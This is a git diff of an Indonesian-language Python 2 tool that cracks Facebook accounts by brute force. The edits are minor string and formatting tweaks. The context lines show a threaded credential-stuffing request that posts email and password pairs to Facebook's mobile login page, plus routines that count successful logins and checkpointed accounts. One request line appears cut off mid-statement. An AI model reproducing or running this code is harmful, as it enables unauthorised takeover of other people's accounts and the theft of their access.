@@ -36,7 +36,6 @@ class mt(threading.Thread):
 	def run(self):
 		try:
 			data = urllib2.urlopen(urllib2.Request(url='https://free.facebook.com/login.php?login_attempt=1',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.0 Mobile Safari/537.36)]
-
 		except KeyboardInterrupt:
 			sys.exit()
 		except:
@@ -77,15 +76,15 @@ def tampilhasil(akun,sandi,data):
 		for i in cekpoint:
 			cetak('!k### !p%s !m=> !b[!k%s!b]'%(i,sandi))
 	cetak('!m[*] Gagal    !c'+str(salah))
-	i = inputD('[?] Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
+	i = inputD('[?] Tidak puas dengan hasil, Mau coba lagi? (y/t)',['Y','T'])
 	if i.upper() == 'Y':
 		return crack(data)
 	else:
 		return menu()
 def crack0(data,sandi):
 	akun = []
-	cetak('!h[*] MengCrack !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
-	cetak('!h[*] Cracking  !k0!m%',1)
+	cetak('!h[*] Mengcrack !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
+	cetak('!h[*] Cracking...  !k0!m%',1)
 	sys.stdout.flush()
 	jml0,jml1 = 0,0
 	th = []
@@ -125,7 +124,7 @@ def crack0(data,sandi):
 			if threading.activeCount() == 1:break
 		except KeyboardInterrupt:
 			keluar()
-	cetak('\r!h[*] Cracking  !k100!m%')
+	cetak('\r!h[*] Cracking  !k100!m%      ')
 	tampilhasil(akun,sandi,data)
 def install_browser():
 	global br
